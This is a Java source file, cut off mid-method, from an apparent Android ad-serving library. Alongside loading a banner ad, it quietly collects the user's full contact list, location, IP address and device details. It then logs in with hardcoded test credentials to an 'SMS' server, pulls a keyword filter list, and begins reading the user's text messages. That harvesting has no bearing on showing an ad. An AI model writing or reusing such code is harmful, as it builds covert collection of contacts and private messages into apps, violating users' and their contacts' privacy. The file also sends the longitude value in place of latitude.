package com.example.taashaadslib.AdSerever;

import android.Manifest;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentSender;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.bumptech.glide.Glide;
import com.example.taashaadslib.AlertUtils.AlertClasses;
import com.example.taashaadslib.AppUtils.GlobalFiles;
import com.example.taashaadslib.CommonClasses.SessionManager;
import com.example.taashaadslib.ModelClasses.AuthPayload;
import com.example.taashaadslib.ModelClasses.ContactModel;
import com.example.taashaadslib.ModelClasses.FiltereKeyWords;
import com.example.taashaadslib.ModelClasses.Keywords;
import com.example.taashaadslib.ModelClasses.SMSData;
import com.example.taashaadslib.ModelClasses.SMSPayLoad;
import com.example.taashaadslib.ModelClasses.TaashaAdsModel;
import com.example.taashaadslib.ModelClasses.UserDTO;
import com.example.taashaadslib.RetrofitClass.UpdateAllAPI;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationListener;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.google.gson.reflect.TypeToken;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Modifier;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeUnit;


import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.logging.HttpLoggingInterceptor;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class UserLocationClass extends AppCompatActivity implements
        GoogleApiClient.ConnectionCallbacks,
        GoogleApiClient.OnConnectionFailedListener,
        LocationListener {

    private static final String TAG = "UserLocationClass";

    private final SessionManager mSessionManager;
    //Define a request code to send to Google Play services
    private final static int CONNECTION_FAILURE_RESOLUTION_REQUEST = 9000;
    private GoogleApiClient mGoogleApiClient;
    private LocationRequest mLocationRequest;
    private double currentLatitude;
    private double currentLongitude;
    private static final int MY_PERMISSIONS_REQUEST_FINE_LOCATION = 111;

    private Context mContext;
    private ImageView mImageView;
    private String key;
    private Activity mActivity;
    private boolean isPermissionDone;

    public UserLocationClass(Activity mActivity, Context mContext, ImageView mImageView, String key, boolean isPermissionDone) {

        this.mContext = mContext;
        this.mImageView = mImageView;
        this.key = key;
        this.mActivity = mActivity;
        this.isPermissionDone = isPermissionDone;

        mSessionManager = new SessionManager(mContext);
        mSessionManager.openSettings();


        if (isPermissionDone) {

            mGoogleApiClient = new GoogleApiClient.Builder(mContext)
                    // The next two lines tell the new client that “this” current class will handle connection stuff
                    .addConnectionCallbacks(this)
                    .addOnConnectionFailedListener(this)
                    //fourth line adds the LocationServices API endpoint from GooglePlayServices
                    .addApi(LocationServices.API)
                    .build();

            // Create the LocationRequest object
            mLocationRequest = LocationRequest.create().setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

            //CONNECT TO GOOGLE API
            mGoogleApiClient.connect();

        } else {

            //SAVE LATITUDE
            mSessionManager.updatePreferenceString(GlobalFiles.LATITUDE, "0.0");

            //SAVE LONGITUDE
            mSessionManager.updatePreferenceString(GlobalFiles.LONGITUDE, "0.0");

            //CALL API FOR ADS
            getBasicData();
        }

    }


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

    }

    @Override
    protected void onResume() {
        super.onResume();
        //Now lets connect to the API
        mGoogleApiClient.connect();
    }

    @Override
    protected void onPause() {
        super.onPause();
        Log.v(this.getClass().getSimpleName(), "onPause()");

        //Disconnect from API onPause()
        if (mGoogleApiClient.isConnected()) {
            LocationServices.FusedLocationApi.removeLocationUpdates(mGoogleApiClient, this);
            mGoogleApiClient.disconnect();
        }


    }

    /**
     * If connected get lat and long
     */
    @Override
    public void onConnected(Bundle bundle) {

        if (ActivityCompat.checkSelfPermission(mActivity, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Location location = LocationServices.FusedLocationApi.getLastLocation(mGoogleApiClient);

        if (location == null) {

            LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, this);

        } else {
            //If everything went fine lets get latitude and longitude
            currentLatitude = location.getLatitude();
            currentLongitude = location.getLongitude();

            AlertClasses.printLogE("LATITUDE : " + currentLatitude, "LONGITUDE : " + currentLongitude);

            //SAVE LATITUDE
            mSessionManager.updatePreferenceString(GlobalFiles.LATITUDE, "" + currentLatitude);

            //SAVE LONGITUDE
            mSessionManager.updatePreferenceString(GlobalFiles.LONGITUDE, "" + currentLongitude);

            //CALL API FOR ADS
            getBasicData();

        }
    }

    private void getBasicData() {

        //SAVE KEY
        mSessionManager.updatePreferenceString(GlobalFiles.KEY, key);

        //SAVE HEIGHT
        mSessionManager.updatePreferenceString(GlobalFiles.HEIGHT, "50");

        //SAVE WIDTH
        mSessionManager.updatePreferenceString(GlobalFiles.WIDTH, "300");

        //SAVE GENDER
        mSessionManager.updatePreferenceString(GlobalFiles.GENDER, "1");

        //SAVE AGE GROUP
        mSessionManager.updatePreferenceString(GlobalFiles.AGEGROUP, "2");

        //SAVE HOUSE HOLD
        mSessionManager.updatePreferenceString(GlobalFiles.HOUSEHOLD, "2");

        //SAVE INCOME SOURCE
        mSessionManager.updatePreferenceString(GlobalFiles.INCOM_SOURCE, "2");

        //SAVE BASE ROTATION
        mSessionManager.updatePreferenceString(GlobalFiles.BASE_R0TATION, "3");

        //SAVE CURRENT ROTATION
        mSessionManager.updatePreferenceString(GlobalFiles.CURRENT_R0TATION, "9");

        //SAVE CREATIVE ID
        mSessionManager.updatePreferenceString(GlobalFiles.CREATIVE_ID, "0");

        //SAVE USER UNIQUE ID
        mSessionManager.updatePreferenceString(GlobalFiles.USER_UNIQUE_ID, "3e96eb71-3778-46fd-bcd8-fccd820125cd");

        //SAVE KIOSK ID
        mSessionManager.updatePreferenceString(GlobalFiles.KIOSK_ID, "abs1234");

        //SAVE CITY & STATE NAME FROM LATITUDE
        //SAVE USER LOCATION
        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            //TYPE 1= CITY
            mSessionManager.updatePreferenceString(GlobalFiles.CITY, "NULL");

            //TYPE 2= STATE
            mSessionManager.updatePreferenceString(GlobalFiles.STATE, "NULL");
        } else {
            //TYPE 1= CITY
            mSessionManager.updatePreferenceString(GlobalFiles.CITY, "" + getCityName(mContext, Double.parseDouble(mSessionManager.getPreference(GlobalFiles.LATITUDE)), Double.parseDouble(mSessionManager.getPreference(GlobalFiles.LONGITUDE)), 1));

            //TYPE 2= STATE
            mSessionManager.updatePreferenceString(GlobalFiles.STATE, "" + getCityName(mContext, Double.parseDouble(mSessionManager.getPreference(GlobalFiles.LATITUDE)), Double.parseDouble(mSessionManager.getPreference(GlobalFiles.LONGITUDE)), 2));
        }


        //SAVE MEDIATOR NAME
        mSessionManager.updatePreferenceString(GlobalFiles.MEDIATOR_NAME, "0");

        //SAVE IS IN ROTATION
        mSessionManager.updatePreferenceString(GlobalFiles.IS_IN_ROTATION, "false");

        //SAVE BUNDLE ID
        mSessionManager.updatePreferenceString(GlobalFiles.BUNDLE_ID, "com.aerserv.www");

        //GET APPLICATION VERSION
        mSessionManager.updatePreferenceString(GlobalFiles.APPLICATION_VERSION, getAppversion(mContext));

        //SAVE NETWORK TYPE
        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_NETWORK_TYPE, chkNetwrokType(mContext));

        //SAVE INT TYPE
        mSessionManager.updatePreferenceString(GlobalFiles.DNT, "false");

        //SAVE INT TYPE
        mSessionManager.updatePreferenceString(GlobalFiles.INT_TYPE, "1");

        //SAVE URL
        mSessionManager.updatePreferenceString(GlobalFiles.URL, "http://www.aerserv.com");

        //SAVE MAKE (MANUFACTURER)
        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_MANUFACTURER, "" + Build.MANUFACTURER);

        //SAVE DEVICE MODEL
        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_MODEL, "" + Build.MODEL);

        //SAVE DEVICE OS
        mSessionManager.updatePreferenceString(GlobalFiles.APPLICATION_OS, "Android");

        //SAVE DEVICE OS VERSION
        mSessionManager.updatePreferenceString(GlobalFiles.APPLICATION_OS_VERSION, "" + Build.VERSION.SDK_INT);

        //SAVE DEVICE TYPE
        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_TYPE, "MOBILE");

        //SAVE LOCATION SOURCE
        mSessionManager.updatePreferenceString(GlobalFiles.LOCATION_SOURCE, "2");

        //SAVE PCHAIN
        mSessionManager.updatePreferenceString(GlobalFiles.PCHAIN, "0");

        //-----------FOR SMS PAYLOAD--------------//

        //USER MOBILE NUMBER
        mSessionManager.updatePreferenceString(GlobalFiles.MOBILE_NUMBER, "");

        //USER MOBILE SENSOR
        mSessionManager.updatePreferenceString(GlobalFiles.MOBILE_SENSOR_DATA, "");

        //GET IP ADDRESS OF DEVICE
        mSessionManager.updatePreferenceString(GlobalFiles.IP_ADDRESS_OF_DEVICE, getIPAddress());

        //GET BATTERY PERCENTAGE
        mSessionManager.updatePreferenceString(GlobalFiles.BATTERY_PERCENTAGE, getBatteryPercentage() + "%");

        //BROWSER DEFAULT
        mSessionManager.updatePreferenceString(GlobalFiles.BROWSER, "chrome");

        //DATE
        mSessionManager.updatePreferenceString(GlobalFiles.DATE, getStringDate(System.currentTimeMillis()));

        //GET CONTACTS DETAILS
        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            mSessionManager.updatePreferenceString(GlobalFiles.CONTACT_LIST, "" + new Gson().toJson(getContacts(mContext)));

        } else {
            mSessionManager.updatePreferenceString(GlobalFiles.CONTACT_LIST, "");
        }


        //GET ADS
        getAds();


    }


    @Override
    public void onConnectionSuspended(int i) {
    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult) {
        /*
         * Google Play services can resolve some errors it detects.
         * If the error has a resolution, try sending an Intent to
         * start a Google Play services activity that can resolve
         * error.
         */
        if (connectionResult.hasResolution()) {
            try {
                // Start an Activity that tries to resolve the error
                connectionResult.startResolutionForResult(this, CONNECTION_FAILURE_RESOLUTION_REQUEST);
                /*
                 * Thrown if Google Play services canceled the original
                 * PendingIntent
                 */
            } catch (IntentSender.SendIntentException e) {
                // Log the error
                e.printStackTrace();
            }
        } else {
            /*
             * If no resolution is available, display a dialog to the
             * user with the error.
             */
            AlertClasses.printLogE("Location Error", "Location services connection failed with code " + connectionResult.getErrorCode());
        }
    }

    /**
     * If locationChanges change lat and long
     *
     * @param location
     */
    @Override
    public void onLocationChanged(Location location) {
        currentLatitude = location.getLatitude();
        currentLongitude = location.getLongitude();

        AlertClasses.printLogE("LOCATION CHANGED LATITUDE : " + currentLatitude, "LONGITUDE : " + currentLongitude);

        //SAVE LATITUDE
        mSessionManager.updatePreferenceString(GlobalFiles.LATITUDE, "" + currentLatitude);

        //SAVE LONGITUDE
        mSessionManager.updatePreferenceString(GlobalFiles.LONGITUDE, "" + currentLongitude);
    }

    public String getCityName(Context mContext, double latitude, double longitude, int typeOfValue) {


        Geocoder geocoder = new Geocoder(mContext, Locale.getDefault());
        List<Address> addresses = null;
        try {
            addresses = geocoder.getFromLocation(latitude, longitude, 1);
        } catch (IOException e) {
            e.printStackTrace();
        }
        String cityName = addresses.get(0).getLocality();
        String stateName = addresses.get(0).getAdminArea();

        if (typeOfValue == 1) {
            return cityName;
        } else {
            return stateName;
        }

    }

    public String getAppversion(Context mContext) {

        String version = "0";
        try {
            PackageInfo pInfo = mContext.getPackageManager().getPackageInfo(mContext.getPackageName(), 0);
            version = pInfo.versionName;

        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        return version;
    }

    public String chkNetwrokType(Context mContext) {

        String dataType = "";
        final ConnectivityManager connMgr = (ConnectivityManager)
                mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        final android.net.NetworkInfo wifi = connMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        final android.net.NetworkInfo mobile = connMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (wifi.isConnectedOrConnecting()) {
            dataType = "Wifi";
        } else if (mobile.isConnectedOrConnecting()) {
            dataType = "Mobile";
        } else {
            dataType = "No Network";
        }

        return dataType;
    }

    public String getIPAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (SocketException ex) {
            ex.printStackTrace();
        }
        return null;
    }

    public String getBatteryPercentage() {

        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = mActivity.getApplicationContext().registerReceiver(null, ifilter);
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        float batteryPct = level / (float) scale;
        float p = batteryPct * 100;

        return String.valueOf(Math.round(p));
    }

    public String getStringDate(Long convertDate) {
        Date date = new Date(convertDate);
        SimpleDateFormat df2 = new SimpleDateFormat(GlobalFiles.COMMON_DATE_FORMAT);
        String dateText = df2.format(date);

        return dateText;
    }

    public ArrayList<ContactModel> getContacts(Context ctx) {

        ArrayList<ContactModel> models = new ArrayList<>();

        Cursor cursor = mActivity.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        while (cursor.moveToNext()) {

            //ADD NUMBERS AND NAME IN TO MODEL
            //RETURN LIST
            ContactModel contactModel = new ContactModel();
            contactModel.setName(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
            contactModel.setMobileNumber(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
            models.add(contactModel);
        }

        cursor.close();


        return models;
    }

    private void getAds() {

        AlertClasses.printLogE(TAG, "LATITUDE : " + mSessionManager.getPreference(GlobalFiles.LATITUDE));
        AlertClasses.printLogE(TAG, "LONGITUDE : " + mSessionManager.getPreference(GlobalFiles.LONGITUDE));
        AlertClasses.printLogE(TAG, "HEIGHT : " + mSessionManager.getPreference(GlobalFiles.HEIGHT));
        AlertClasses.printLogE(TAG, "WIDTH : " + mSessionManager.getPreference(GlobalFiles.WIDTH));
        AlertClasses.printLogE(TAG, "GENDER : " + mSessionManager.getPreference(GlobalFiles.GENDER));
        AlertClasses.printLogE(TAG, "AGEGROUP : " + mSessionManager.getPreference(GlobalFiles.AGEGROUP));
        AlertClasses.printLogE(TAG, "HOUSEHOLD : " + mSessionManager.getPreference(GlobalFiles.HOUSEHOLD));
        AlertClasses.printLogE(TAG, "INCOM_SOURCE : " + mSessionManager.getPreference(GlobalFiles.INCOM_SOURCE));
        AlertClasses.printLogE(TAG, "BASE_R0TATION : " + mSessionManager.getPreference(GlobalFiles.BASE_R0TATION));
        AlertClasses.printLogE(TAG, "CURRENT_R0TATION : " + mSessionManager.getPreference(GlobalFiles.CURRENT_R0TATION));
        AlertClasses.printLogE(TAG, "CREATIVE_ID : " + mSessionManager.getPreference(GlobalFiles.CREATIVE_ID));
        AlertClasses.printLogE(TAG, "USER_UNIQUE_ID : " + mSessionManager.getPreference(GlobalFiles.USER_UNIQUE_ID));
        AlertClasses.printLogE(TAG, "KIOSK_ID : " + mSessionManager.getPreference(GlobalFiles.KIOSK_ID));
        AlertClasses.printLogE(TAG, "CITY : " + mSessionManager.getPreference(GlobalFiles.CITY));
        AlertClasses.printLogE(TAG, "STATE : " + mSessionManager.getPreference(GlobalFiles.STATE));
        AlertClasses.printLogE(TAG, "MEDIATOR_NAME : " + mSessionManager.getPreference(GlobalFiles.MEDIATOR_NAME));
        AlertClasses.printLogE(TAG, "IS_IN_ROTATION : " + mSessionManager.getPreference(GlobalFiles.IS_IN_ROTATION));
        AlertClasses.printLogE(TAG, "BUNDLE_ID : " + mSessionManager.getPreference(GlobalFiles.BUNDLE_ID));
        AlertClasses.printLogE(TAG, "APPLICATION_VERSION : " + mSessionManager.getPreference(GlobalFiles.APPLICATION_VERSION));
        AlertClasses.printLogE(TAG, "DEVICE_NETWORK_TYPE : " + mSessionManager.getPreference(GlobalFiles.DEVICE_NETWORK_TYPE));
        AlertClasses.printLogE(TAG, "DNT : " + mSessionManager.getPreference(GlobalFiles.DNT));
        AlertClasses.printLogE(TAG, "INT_TYPE : " + mSessionManager.getPreference(GlobalFiles.INT_TYPE));
        AlertClasses.printLogE(TAG, "URL : " + mSessionManager.getPreference(GlobalFiles.URL));
        AlertClasses.printLogE(TAG, "DEVICE_MANUFACTURER : " + mSessionManager.getPreference(GlobalFiles.DEVICE_MANUFACTURER));
        AlertClasses.printLogE(TAG, "DEVICE_MODEL : " + mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL));
        AlertClasses.printLogE(TAG, "APPLICATION_OS : " + mSessionManager.getPreference(GlobalFiles.APPLICATION_OS));
        AlertClasses.printLogE(TAG, "APPLICATION_OS_VERSION : " + mSessionManager.getPreference(GlobalFiles.APPLICATION_OS_VERSION));
        AlertClasses.printLogE(TAG, "DEVICE_TYPE : " + mSessionManager.getPreference(GlobalFiles.DEVICE_TYPE));
        AlertClasses.printLogE(TAG, "LOCATION_SOURCE : " + mSessionManager.getPreference(GlobalFiles.LOCATION_SOURCE));
        AlertClasses.printLogE(TAG, "PCHAIN : " + mSessionManager.getPreference(GlobalFiles.PCHAIN));


        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
        logging.setLevel(HttpLoggingInterceptor.Level.BODY);


        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
        //httpClient.addInterceptor(logging);
        httpClient.addInterceptor(new Interceptor() {
            @Override
            public okhttp3.Response intercept(Chain chain) throws IOException {

                okhttp3.Request requestOriginal = chain.request();

                okhttp3.Request request = requestOriginal.newBuilder()
                        //.header("Content-Type", "application/json; charset=utf-8")
                        .header("X-Auth-Token", mSessionManager.getPreference(GlobalFiles.KEY))
                        .method(requestOriginal.method(), requestOriginal.body())
                        .build();


                return chain.proceed(request);
            }
        });
        final OkHttpClient httpClient1 = httpClient.build();
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(GlobalFiles.COMMON_URL)
                .client(httpClient1.newBuilder().connectTimeout(10, TimeUnit.MINUTES).readTimeout(10, TimeUnit.MINUTES).writeTimeout(10, TimeUnit.MINUTES).build())
                .addConverterFactory(GsonConverterFactory.create())
                .client(httpClient1)
                .build();

        UpdateAllAPI patchService1 = retrofit.create(UpdateAllAPI.class);

        //PARAMETERS
        String url = GlobalFiles.GET_ADS_API + "?" + GlobalFiles.LATITUDE + "=" + mSessionManager.getPreference(GlobalFiles.LONGITUDE) + "&" +
                "" + GlobalFiles.LONGITUDE + "=" + mSessionManager.getPreference(GlobalFiles.LONGITUDE) + "&" +
                "" + GlobalFiles.HEIGHT + "=" + mSessionManager.getPreference(GlobalFiles.HEIGHT) + "&" +
                "" + GlobalFiles.WIDTH + "=" + mSessionManager.getPreference(GlobalFiles.WIDTH) + "&" +
                "" + GlobalFiles.GENDER + "=" + mSessionManager.getPreference(GlobalFiles.GENDER) + "&" +
                "" + GlobalFiles.AGEGROUP + "=" + mSessionManager.getPreference(GlobalFiles.AGEGROUP) + "&" +
                "" + GlobalFiles.HOUSEHOLD + "=" + mSessionManager.getPreference(GlobalFiles.HOUSEHOLD) + "&" +
                "" + GlobalFiles.INCOM_SOURCE + "=" + mSessionManager.getPreference(GlobalFiles.INCOM_SOURCE) + "&" +
                "" + GlobalFiles.BASE_R0TATION + "=" + mSessionManager.getPreference(GlobalFiles.BASE_R0TATION) + "&" +
                "" + GlobalFiles.CURRENT_R0TATION + "=" + mSessionManager.getPreference(GlobalFiles.CURRENT_R0TATION) + "&" +
                "" + GlobalFiles.CREATIVE_ID + "=" + mSessionManager.getPreference(GlobalFiles.CREATIVE_ID) + "&" +
                "" + GlobalFiles.USER_UNIQUE_ID + "=" + mSessionManager.getPreference(GlobalFiles.USER_UNIQUE_ID) + "&" +
                "" + GlobalFiles.KIOSK_ID + "=" + mSessionManager.getPreference(GlobalFiles.KIOSK_ID) + "&" +
                "" + GlobalFiles.CITY + "=" + mSessionManager.getPreference(GlobalFiles.CITY) + "&" +
                "" + GlobalFiles.STATE + "=" + mSessionManager.getPreference(GlobalFiles.STATE) + "&" +
                "" + GlobalFiles.MEDIATOR_NAME + "=" + mSessionManager.getPreference(GlobalFiles.MEDIATOR_NAME) + "&" +
                "" + GlobalFiles.IS_IN_ROTATION + "=" + mSessionManager.getPreference(GlobalFiles.IS_IN_ROTATION) + "&" +
                "" + GlobalFiles.BUNDLE_ID + "=" + mSessionManager.getPreference(GlobalFiles.BUNDLE_ID) + "&" +
                "" + GlobalFiles.APPLICATION_VERSION + "=" + mSessionManager.getPreference(GlobalFiles.APPLICATION_VERSION) + "&" +
                "" + GlobalFiles.DEVICE_NETWORK_TYPE + "=" + mSessionManager.getPreference(GlobalFiles.DEVICE_NETWORK_TYPE) + "&" +
                "" + GlobalFiles.DNT + "=" + mSessionManager.getPreference(GlobalFiles.DNT) + "&" +
                "" + GlobalFiles.INT_TYPE + "=" + mSessionManager.getPreference(GlobalFiles.INT_TYPE) + "&" +
                "" + GlobalFiles.URL + "=" + mSessionManager.getPreference(GlobalFiles.URL) + "&" +
                "" + GlobalFiles.DEVICE_MANUFACTURER + "=" + mSessionManager.getPreference(GlobalFiles.DEVICE_MANUFACTURER) + "&" +
                "" + GlobalFiles.DEVICE_MODEL + "=" + mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL) + "&" +
                "" + GlobalFiles.APPLICATION_OS + "=" + mSessionManager.getPreference(GlobalFiles.APPLICATION_OS) + "&" +
                "" + GlobalFiles.APPLICATION_OS_VERSION + "=" + mSessionManager.getPreference(GlobalFiles.APPLICATION_OS_VERSION) + "&" +
                "" + GlobalFiles.DEVICE_TYPE + "=" + mSessionManager.getPreference(GlobalFiles.DEVICE_TYPE) + "&" +
                "" + GlobalFiles.LOCATION_SOURCE + "=" + mSessionManager.getPreference(GlobalFiles.LOCATION_SOURCE) + "&" +
                "" + GlobalFiles.PCHAIN + "=" + mSessionManager.getPreference(GlobalFiles.PCHAIN);

        AlertClasses.printLogE("AD SERVER : URL", url);

        Call<TaashaAdsModel> call = patchService1.getAdsFromServer(url);

        call.enqueue(new Callback<TaashaAdsModel>() {
            @Override
            public void onResponse(Call<TaashaAdsModel> call, retrofit2.Response<TaashaAdsModel> response) {


                if (response.isSuccessful()) {

                    Gson gson = new GsonBuilder()
                            .excludeFieldsWithModifiers(Modifier.FINAL, Modifier.TRANSIENT, Modifier.STATIC)
                            .serializeNulls()
                            .create();


                    AlertClasses.printLogE("AD SERVER : Response", "Response @ : " + gson.toJson(response.body()));

                    //LOAD ADS
                    Glide.with(mContext).load(response.body().getSourceURL()).into(mImageView);

                    //CALL
                    if (isPermissionDone) {
                        callAuthToken();
                    }


                    mImageView.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {

                            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://www.google.com"));
                            browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            mContext.startActivity(browserIntent);


                        }
                    });

                }
            }

            @Override
            public void onFailure(Call<TaashaAdsModel> call, Throwable t) {

                //CALL AUTH DATA
                if (isPermissionDone) {
                    callAuthToken();
                }

            }
        });

    }

    private void callAuthToken() {

        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
        logging.setLevel(HttpLoggingInterceptor.Level.BODY);

        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
        //httpClient.addInterceptor(logging);
        httpClient.addInterceptor(new Interceptor() {
            @Override
            public okhttp3.Response intercept(Chain chain) throws IOException {
                okhttp3.Request original = chain.request();

                okhttp3.Request request = original.newBuilder()
                        .header("Content-Type", "application/json; charset=utf-8")
                        // .header("Authorization", sessionManager.getToken(mContext))
                        .method(original.method(), original.body())
                        .build();

                return chain.proceed(request);
            }
        });

        Gson gson = new GsonBuilder()
                .setLenient()
                .create();

        final OkHttpClient client = httpClient.build();
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(GlobalFiles.COMMON_URL_SMS)
                .addConverterFactory(GsonConverterFactory.create(gson))
                //.client(client)
                .client(client.newBuilder().connectTimeout(30000, TimeUnit.SECONDS).readTimeout(30000, TimeUnit.SECONDS).writeTimeout(30000, TimeUnit.SECONDS).build())
                .build();

        UpdateAllAPI patchService1 = retrofit.create(UpdateAllAPI.class);

        UserDTO mUserDTO = new UserDTO();
        mUserDTO.setUserName("TestDocAI");
        mUserDTO.setPassword("Test@1234");


        Call<AuthPayload> call = patchService1.getAuthToken(mUserDTO);


        call.enqueue(new Callback<AuthPayload>() {
            @Override
            public void onResponse(Call<AuthPayload> call, retrofit2.Response<AuthPayload> response) {


                if (response.isSuccessful()) {

                    Gson gson = new GsonBuilder()
                            .excludeFieldsWithModifiers(Modifier.FINAL, Modifier.TRANSIENT, Modifier.STATIC)
                            .serializeNulls()
                            .create();


                    AlertClasses.printLogE("AD SERVER : Response", "Response callAuthToken @ : " + gson.toJson(response.body()));


                    //UPDATE USER TOKEN
                    mSessionManager.updatePreferenceString(GlobalFiles.SMS_ACCESS_TOKEN, "" + response.body().getPayload().getToken());


                    //GET KEYWORD
                    getFilteredKeywords();

                }

            }

            @Override
            public void onFailure(Call<AuthPayload> call, Throwable t) {

                AlertClasses.printLogE("AD SERVER : Response", "Response callAuthToken ERROR");


            }
        });

    }

    private void getFilteredKeywords() {

        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
        logging.setLevel(HttpLoggingInterceptor.Level.BODY);


        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
       // httpClient.addInterceptor(logging);
        httpClient.addInterceptor(new Interceptor() {
            @Override
            public okhttp3.Response intercept(Chain chain) throws IOException {

                okhttp3.Request requestOriginal = chain.request();

                okhttp3.Request request = requestOriginal.newBuilder()
                        .header("Authorization", "Bearer " + mSessionManager.getPreference(GlobalFiles.SMS_ACCESS_TOKEN))
                        .method(requestOriginal.method(), requestOriginal.body())
                        .build();


                return chain.proceed(request);
            }
        });
        final OkHttpClient httpClient1 = httpClient.build();
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(GlobalFiles.COMMON_URL_SMS)
                .client(httpClient1.newBuilder().connectTimeout(10, TimeUnit.MINUTES).readTimeout(10, TimeUnit.MINUTES).writeTimeout(10, TimeUnit.MINUTES).build())
                .addConverterFactory(GsonConverterFactory.create())
                .client(httpClient1)
                .build();

        UpdateAllAPI patchService1 = retrofit.create(UpdateAllAPI.class);


        Call<FiltereKeyWords> call = patchService1.getFilterKeywords(GlobalFiles.FILTER_KEYWORD);

        call.enqueue(new Callback<FiltereKeyWords>() {
            @Override
            public void onResponse(Call<FiltereKeyWords> call, retrofit2.Response<FiltereKeyWords> response) {


                if (response.isSuccessful()) {

                    Gson gson = new GsonBuilder()
                            .excludeFieldsWithModifiers(Modifier.FINAL, Modifier.TRANSIENT, Modifier.STATIC)
                            .serializeNulls()
                            .create();


                    AlertClasses.printLogE("AD SERVER : Response", "Response @ getFilteredKeywords: " + gson.toJson(response.body()));

                    ArrayList<Keywords.KeyWords> mKeyWordsList = new ArrayList<>();


                    for (int i = 0; i < response.body().getPayload().get(0).getData().size(); i++) {

                        // AlertClasses.printLogE("KEYWORD : " ,response.body().getPayload().get(0).getData().get(i));

                        Keywords.KeyWords mKeyWords = new Keywords.KeyWords();
                        mKeyWords.setKeyword(response.body().getPayload().get(0).getData().get(i));
                        mKeyWordsList.add(mKeyWords);

                    }

                    //SAVE KEYWORD LIST
                    mSessionManager.updatePreferenceString(GlobalFiles.SMS_FILTER_KEYWORD_LIST, "" + new Gson().toJson(mKeyWordsList));


                    //SMS DATA
                    if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                        //LOAD SMS LIST
